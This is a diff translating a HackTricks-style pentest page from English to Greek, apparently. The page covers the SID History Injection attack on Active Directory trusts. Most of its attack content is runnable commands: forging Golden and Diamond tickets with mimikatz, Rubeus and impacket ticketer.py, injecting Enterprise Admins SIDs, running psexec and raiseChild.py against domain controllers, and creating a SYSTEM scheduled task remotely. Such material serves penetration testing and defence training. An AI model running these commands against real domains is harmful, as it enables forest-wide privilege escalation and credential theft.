@@ -4,22 +4,19 @@
 
 ## SID History Injection Attack
 
-The focus of the **SID History Injection Attack** is aiding **user migration between domains** while ensuring continued access to resources from the former domain. This is accomplished by **incorporating the user's previous Security Identifier (SID) into the SID History** of their new account. Notably, this process can be manipulated to grant unauthorized access by adding the SID of a high-privilege group (such as Enterprise Admins or Domain Admins) from the parent domain to the SID History. This exploitation confers access to all resources within the parent domain.
+Η εστίαση της **Επίθεσης Εισαγωγής Ιστορικού SID** είναι η βοήθεια **μεταφοράς χρηστών μεταξύ τομέων** ενώ διασφαλίζεται η συνεχής πρόσβαση σε πόρους από τον πρώην τομέα. Αυτό επιτυγχάνεται με **την ενσωμάτωση του προηγούμενου Αναγνωριστικού Ασφαλείας (SID) του χρήστη στο Ιστορικό SID** του νέου του λογαριασμού. Σημαντικό είναι ότι αυτή η διαδικασία μπορεί να παραποιηθεί για να παραχωρήσει μη εξουσιοδοτημένη πρόσβαση προσθέτοντας το SID μιας ομάδας υψηλών προνομίων (όπως οι Enterprise Admins ή Domain Admins) από τον γονικό τομέα στο Ιστορικό SID. Αυτή η εκμετάλλευση παρέχει πρόσβαση σε όλους τους πόρους εντός του γονικού τομέα.
 
-Two methods exist for executing this attack: through the creation of either a **Golden Ticket** or a **Diamond Ticket**.
+Υπάρχουν δύο μέθοδοι για την εκτέλεση αυτής της επίθεσης: μέσω της δημιουργίας είτε ενός **Golden Ticket** είτε ενός **Diamond Ticket**.
 
-To pinpoint the SID for the **"Enterprise Admins"** group, one must first locate the SID of the root domain. Following the identification, the Enterprise Admins group SID can be constructed by appending `-519` to the root domain's SID. For instance, if the root domain SID is `S-1-5-21-280534878-1496970234-700767426`, the resulting SID for the "Enterprise Admins" group would be `S-1-5-21-280534878-1496970234-700767426-519`.
+Για να προσδιορίσετε το SID της ομάδας **"Enterprise Admins"**, πρέπει πρώτα να εντοπίσετε το SID του ριζικού τομέα. Αφού γίνει η αναγνώριση, το SID της ομάδας Enterprise Admins μπορεί να κατασκευαστεί προσθέτοντας `-519` στο SID του ριζικού τομέα. Για παράδειγμα, αν το SID του ριζικού τομέα είναι `S-1-5-21-280534878-1496970234-700767426`, το αποτέλεσμα SID για την ομάδα "Enterprise Admins" θα ήταν `S-1-5-21-280534878-1496970234-700767426-519`.
 
-You could also use the **Domain Admins** groups, which ends in **512**.
+Μπορείτε επίσης να χρησιμοποιήσετε τις ομάδες **Domain Admins**, οι οποίες τελειώνουν σε **512**.
 
-Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:
-
+Ένας άλλος τρόπος για να βρείτε το SID μιας ομάδας του άλλου τομέα (για παράδειγμα "Domain Admins") είναι με:
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
-
+### Χρυσό Εισιτήριο (Mimikatz) με KRBTGT-AES256
 ```bash
 mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid:<current_domain_sid> /sids:<victim_domain_sid_of_group> /aes256:<krbtgt_aes256> /startoffset:-10 /endin:600 /renewmax:10080 /ticket:ticket.kirbi" "exit"
 
@@ -36,15 +33,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-
-For more info about golden tickets check:
+Για περισσότερες πληροφορίες σχετικά με τα χρυσά εισιτήρια, ελέγξτε:
 
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
-
+### Διαμαντένιο Εισιτήριο (Rubeus + KRBTGT-AES256)
 ```powershell
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
@@ -54,21 +49,17 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 
 # You can use "Administrator" as username or any other string
 ```
-
-For more info about diamond tickets check:
+Για περισσότερες πληροφορίες σχετικά με τα διαμάντια εισιτήρια, ελέγξτε:
 
 {{#ref}}
 diamond-ticket.md
 {{#endref}}
-
 ```bash
 .\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-
-Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
-
+Αναβάθμιση σε DA του root ή Enterprise admin χρησιμοποιώντας το hash KRBTGT του παραβιασμένου τομέα:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -80,17 +71,15 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-
-With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
+Με τις αποκτηθείσες άδειες από την επίθεση, μπορείτε να εκτελέσετε για παράδειγμα μια επίθεση DCSync στο νέο τομέα:
 
 {{#ref}}
 dcsync.md
 {{#endref}}
 
-### From linux
+### Από linux
 
-#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
-
+#### Χειροκίνητα με [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -110,31 +99,27 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
+#### Αυτόματα χρησιμοποιώντας [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
 
-#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+Αυτό είναι ένα σενάριο Impacket που θα **αυτοματοποιήσει την αναβάθμιση από το παιδικό στο γονικό τομέα**. Το σενάριο χρειάζεται:
 
-This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
+- Στοχευμένος ελεγκτής τομέα
+- Διαπιστευτήρια για έναν διαχειριστή χρήστη στον παιδικό τομέα
 
-- Target domain controller
-- Creds for an admin user in the child domain
+Η ροή είναι:
 
-The flow is:
-
-- Obtains the SID for the Enterprise Admins group of the parent domain
-- Retrieves the hash for the KRBTGT account in the child domain
-- Creates a Golden Ticket
-- Logs into the parent domain
-- Retrieves credentials for the Administrator account in the parent domain
-- If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
-
+- Αποκτά το SID για την ομάδα Enterprise Admins του γονικού τομέα
+- Ανακτά το hash για τον λογαριασμό KRBTGT στον παιδικό τομέα
+- Δημιουργεί ένα Golden Ticket
+- Συνδέεται στον γονικό τομέα
+- Ανακτά διαπιστευτήρια για τον λογαριασμό Administrator στον γονικό τομέα
+- Εάν έχει καθοριστεί η επιλογή `target-exec`, αυθεντικοποιείται στον Ελεγκτή Τομέα του γονικού τομέα μέσω Psexec.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-
-## References
+## Αναφορές
 
 - [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
 - [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
